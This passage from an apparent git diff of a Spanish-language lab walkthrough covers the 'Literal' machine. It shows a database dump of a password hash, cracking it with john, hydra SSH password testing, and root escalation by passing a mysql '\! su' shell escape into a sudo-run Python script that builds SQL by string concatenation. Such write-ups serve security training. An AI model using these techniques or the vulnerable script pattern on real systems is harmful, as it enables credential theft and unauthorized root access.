+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 5
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: created
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: email
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: id
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: password
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: username
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching entries for table 'forum_owner' in database 'forumtesting'
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of entries for table 'forum_owner' in database 'forumtesting'
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 1
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 2022-02-12
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: carlos@forumtesting.literal.htb
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 1
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: carlos
+Database: forumtesting
+Table: forum_owner
+[1 entry]
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+| id | email                           | created    | password                                                                                                                         | username |
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
+| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
++----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aplicando fuerza bruta al hash con <code class="language-plaintext highlighter-rouge">john</code> obtenemos la contraseña de <code class="language-plaintext highlighter-rouge">carlos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-SHA512  
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 XOP 2x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=3
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">forum100889</span><span class="p">      (</span><span class="am">carlos</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al comprobar las <code class="language-plaintext highlighter-rouge">credenciales</code> con <code class="language-plaintext highlighter-rouge">hydra</code> hacia la maquina victima, igual que antes esta <code class="language-plaintext highlighter-rouge">contraseña</code> no es válida para <code class="language-plaintext highlighter-rouge">ssh</code> como el usuario <code class="language-plaintext highlighter-rouge">carlos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hydra</span><span class="p"> -l carlos -p forum100889 ssh://192.168.100.87
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1)  
+[DATA] attacking ssh://192.168.100.87:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
+</code></pre></div></div><br>
 
 </section>
+
+<section class="post" id="shell-carlos">
+<br><h3 class="post-title">Shell - carlos</h3><br>
+
+<p class="plain-text">Aunque tarde bastante en llegar a esta conclusión, sabemos que la contraseña <code class="language-plaintext highlighter-rouge">forum100889</code> es valida para el <code class="language-plaintext highlighter-rouge">forum</code>, asi que tal vez use <code class="language-plaintext highlighter-rouge">ssh100889</code> para <code class="language-plaintext highlighter-rouge">ssh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">forum</span><span class="p">100889   -->   forum  
+</span><span class="ve">ssh</span><span class="p">100889   -->   ssh</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">hydra</code> y esta contraseña es <code class="language-plaintext highlighter-rouge">válida</code> para el usuario <code class="language-plaintext highlighter-rouge">carlos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ hydra</span><span class="p"> -l carlos -p ssh100889 ssh://192.168.100.87
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1)  
+[DATA] attacking ssh://192.168.100.87:22/
+[</span><span class="ve">22</span><span class="p">][</span><span class="ve">ssh</span><span class="p">] host: </span><span class="ve">192.168.100.87</span><span class="p">   login: </span><span class="ve">carlos</span><span class="p">   password: </span><span class="ve">ssh100889</span><span class="p">
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code> y obtenemos la primera <code class="language-plaintext highlighter-rouge">flag</code> de la máquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">carlos@192.168.100.87
+carlos@192.168.100.87's password: ssh100889
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)  
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+192.168.100.87
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt
+6d3**************************222
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Si miramos privilegios a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>, podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code> un script en <code class="language-plaintext highlighter-rouge">python</code> con cualquier <code class="language-plaintext highlighter-rouge">argumento</code>, tenemos capacidad de <code class="language-plaintext highlighter-rouge">lectura</code> sobre script</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
+Matching Defaults entries for carlos on literal:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/bin\:/snap/bin  
+
+User carlos may run the following commands on literal:
+    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /opt/my_things/blog/update_project_status.py
+#!/usr/bin/python3
+
+# Learning python3 to update my project status
+## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P
+
+'''
+References:
+* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
+* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
+* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
+* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
+* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
+* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
+'''
+
+import os
+import sys
+from datetime import date
+
+# Functions ------------------------------------------------.
+def execute_query(sql):
+    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")
+
+# Query all rows
+def query_all():
+    sql = "SELECT * FROM projects;"
+    execute_query(sql)
+
+# Query row by ID
+def query_by_id(arg_project_id):
+    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
+    execute_query(sql)
+
+# Update database
+def update_status(enddate, arg_project_id, arg_project_status):
+    if enddate != 0:
+        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
+    else:
+        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
+
+    execute_query(sql)
+
+# Main program
+def main():
+    # Fast validation
+    try:
+        arg_project_id = sys.argv[1]
+    except:
+        arg_project_id = ""
+
+    try:
+        arg_project_status = sys.argv[2]
+    except:
+        arg_project_status = ""
+
+    if arg_project_id and arg_project_status: # To update
+        # Avoid update by error
+        if os.geteuid() == 0:
+            array_status = ["Done", "Doing", "To do"]
+            if arg_project_status in array_status:
+                print("[+] Before update project (" + arg_project_id + ")\n")
+                query_by_id(arg_project_id)
+
+                if arg_project_status == 'Done':
+                    update_status(date.today(), arg_project_id, arg_project_status)
+                else:
+                    update_status(0, arg_project_id, arg_project_status)
+            else:
+                print("Bro, avoid a fail: Done - Doing - To do")
+                exit(1)
+
+            print("\n[+] New status of project (" + arg_project_id + ")\n")
+            query_by_id(arg_project_id)
+        else:
+            print("Ejejeeey, avoid mistakes!")
+            exit(1)
+
+    elif arg_project_id:
+        query_by_id(arg_project_id)
+    else:
+        query_all()
+
+# Variables ------------------------------------------------.
+db_user = "carlos"
+db_name = "blog"
+
+# Main program
+main()
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El funcionamiento del programa es relativamente sencillo, al ejecutarlo sin ningun <code class="language-plaintext highlighter-rouge">argumento</code> simplemente nos lista todas las <code class="language-plaintext highlighter-rouge">columnas</code> de la tabla <code class="language-plaintext highlighter-rouge">projects</code></code>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py
++-------+--------------------------------------------------------------+---------------------+------------+-----------+
+| proid | proname                                                      | prodatecreated      | prodateend | prostatus |
++-------+--------------------------------------------------------------+---------------------+------------+-----------+
+|     1 | Ascii Art Python - ABCdario with colors                      | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
+|     2 | Ascii Art Python - Show logos only with letter A             | 2021-09-20 18:06:22 | 2222-12-12 | To do     |
+|     3 | Ascii Art Bash - Show musical stores (WTF)                   | 2021-09-20 18:06:50 | 2222-12-12 | To do     |
+|     4 | Forum - Add that people can send me bug reports of projects  | 2023-04-07 17:40:41 | 2023-11-01 | Doing     |
+|     5 | Validate syntax errors on blog pages                         | 2021-09-20 18:07:43 | 2222-12-12 | Doing     |
+|     6 | Script to extract info from files and upload it to any DB    | 2021-09-20 18:07:58 | 2222-12-12 | Doing     |
+|     7 | Forum - Implement forum form                                 | 2023-04-07 17:46:38 | 2023-11-01 | Doing     |
+|     8 | Add that people can create their own projects on DB          | 2021-09-20 18:49:52 | 2222-12-12 | To do     |
+|     9 | Ascii Art C - Start learning Ascii Art with C                | 2021-09-20 18:50:02 | 2222-12-12 | To do     |
+|    10 | Ascii Art Bash - Welcome banner preview in blog home         | 2021-09-20 18:50:08 | 2222-12-12 | To do     |
+|    11 | Blog - Create login and register form                        | 2023-04-07 17:40:28 | 2023-08-21 | Done      |
+|    12 | Blog - Improve the appearance of the dashboard/projects page | 2021-09-20 18:50:18 | 2222-12-12 | Doing     |
++-------+--------------------------------------------------------------+---------------------+------------+-----------+  
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo que hace con el <code class="language-plaintext highlighter-rouge">primer</code> argumento es listar todas las <code class="language-plaintext highlighter-rouge">columnas</code> de la tabla <code class="language-plaintext highlighter-rouge">projects</code> pero donde el <code class="language-plaintext highlighter-rouge">proid</code> sea igual al <code class="language-plaintext highlighter-rouge">argumento</code> que en este caso es <code class="language-plaintext highlighter-rouge">1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py 1
++-------+-----------------------------------------+---------------------+------------+-----------+
+| proid | proname                                 | prodatecreated      | prodateend | prostatus |
++-------+-----------------------------------------+---------------------+------------+-----------+
+|     1 | Ascii Art Python - ABCdario with colors | 2023-05-05 05:04:56 | 2023-05-05 | Done      |
++-------+-----------------------------------------+---------------------+------------+-----------+  
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">segundo</code> argumento actualiza el valor <code class="language-plaintext highlighter-rouge">prostatus</code> del <code class="language-plaintext highlighter-rouge">proid</code> seleccionado en el primer argumento a cualquiera de los siguientes valores, <code class="language-plaintext highlighter-rouge">Done</code>, <code class="language-plaintext highlighter-rouge">Doing</code> y <code class="language-plaintext highlighter-rouge">To do</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py 1 "To do"
+[+] Before update project (1)
+
++-------+-----------------------------------------+---------------------+------------+-----------+
+| proid | proname                                 | prodatecreated      | prodateend | prostatus |
++-------+-----------------------------------------+---------------------+------------+-----------+
+|     1 | Ascii Art Python - ABCdario with colors | 2023-05-05 05:05:28 | 2023-05-05 | Done      |
++-------+-----------------------------------------+---------------------+------------+-----------+
+
+[+] New status of project (1)
+
++-------+-----------------------------------------+---------------------+------------+-----------+
+| proid | proname                                 | prodatecreated      | prodateend | prostatus |
++-------+-----------------------------------------+---------------------+------------+-----------+
+|     1 | Ascii Art Python - ABCdario with colors | 2023-05-05 05:05:42 | 2222-12-12 | To do     |
++-------+-----------------------------------------+---------------------+------------+-----------+  
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La vulnerabilidad salta a la vista, el primer <code class="language-plaintext highlighter-rouge">argumento</code> se guarda en <code class="language-plaintext highlighter-rouge">arg_project_id</code> que se ejecuta en una <code class="language-plaintext highlighter-rouge">query sql</code> sin mas, en pocas palabras ejecutaria algo asi</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">def </span><span class="na">main</span><span class="p">():
+</span><span class="c1">    # Fast validation
+    </span><span class="o">try</span><span class="p">:
+        arg_project_id </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">]
+    </span><span class="o">except</span><span class="p">:
+        arg_project_id </span><span class="o">= </span><span class="s">""</span><span class="p">
+
+
+</span><span class="o">def </span><span class="na">query_by_id</span><span class="p">(</span><span class="am">arg_project_id</span><span class="p">):
+    sql </span><span class="o">= </span><span class="s">"SELECT * FROM projects WHERE proid = " </span><span class="o">+ </span><span class="p">arg_project_id </span><span class="o">+ </span><span class="s">";"  
+</span><span class="p">    execute_query(sql)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">SELECT </span><span class="p">* </span><span class="o">FROM </span><span class="p">projects </span><span class="o">WHERE </span><span class="p">proid </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">];  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la ayuda de <code class="language-plaintext highlighter-rouge">mysql</code>, podemos ver que hay un parametro para ejecutar <code class="language-plaintext highlighter-rouge">comandos</code> el cual es <code class="language-plaintext highlighter-rouge">\!</code> podemos ejecutar un simple <code class="language-plaintext highlighter-rouge">id</code> para comprobarlo, lo ejecuta <code class="language-plaintext highlighter-rouge">carlos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ mysql
+</span><span class="p">mysql> \h
+
+For information about MySQL products and services, visit:
+   http://www.mysql.com/
+For developer information, including the MySQL Reference Manual, visit:
+   http://dev.mysql.com/
+To buy MySQL Enterprise support, training, or other products, visit:
+   https://shop.mysql.com/
+
+List of all MySQL commands:
+Note that all text commands must be first on line and end with ';'
+?         (\?) Synonym for `help'.
+clear     (\c) Clear the current input statement.
+connect   (\r) Reconnect to the server. Optional arguments are db and host.
+delimiter (\d) Set statement delimiter.
+edit      (\e) Edit command with $EDITOR.
+ego       (\G) Send command to mysql server, display result vertically.
+exit      (\q) Exit mysql. Same as quit.
+go        (\g) Send command to mysql server.
+help      (\h) Display this help.
+nopager   (\n) Disable pager, print to stdout.
+notee     (\t) Don't write into outfile.
+pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
+print     (\p) Print current command.
+prompt    (\R) Change your mysql prompt.
+quit      (\q) Quit mysql.
+rehash    (\#) Rebuild completion hash.
+source    (\.) Execute an SQL script file. Takes a file name as an argument.
+status    (\s) Get status information from the server.
+system    (\!) Execute a system shell command.
+tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
+use       (\u) Use another database. Takes database name as argument.
+charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.  
+warnings  (\W) Show warnings after every statement.
+nowarning (\w) Don't show warnings after every statement.
+resetconnection(\x) Clean session context.
+query_attributes Sets string parameters (name1 value1 name2 value2 ...) for the next query to pick up.
+ssl_session_data_print Serializes the current SSL session data to stdout or file
+
+For server side help, type 'help contents'
+
+</span><span class="p">mysql> \! id;
+uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)  
+mysql></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si esta hubiera sido nuestro <code class="language-plaintext highlighter-rouge">argumento</code> en el script la <code class="language-plaintext highlighter-rouge">query</code> que se hubiera ejecutado seria la siguiente, que aunque la sintaxis no es perfecta se <code class="language-plaintext highlighter-rouge">ejecuta</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mysql> SELECT * FROM projects WHERE proid = \! id;
+uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)  
+    -></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobarlo, le pasamos <code class="language-plaintext highlighter-rouge">\! id</code> como primer <code class="language-plaintext highlighter-rouge">argumento</code> y ocultamos los errores, como lo ejecutamos con <code class="language-plaintext highlighter-rouge">sudo</code> el output del comando <code class="language-plaintext highlighter-rouge">id</code> es de <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py '\! id' 2>/dev/null  
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos queda cambiar el id por <code class="language-plaintext highlighter-rouge">su</code> para convertirnos en root y ver la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py '\! su'  
+</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+192.168.100.87
+</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/root.txt
+ca4**************************730
+</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
 
 </section>
 
@@ -388,4 +1078,3 @@ ydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
     </div>
   </body>
 </html>
--->
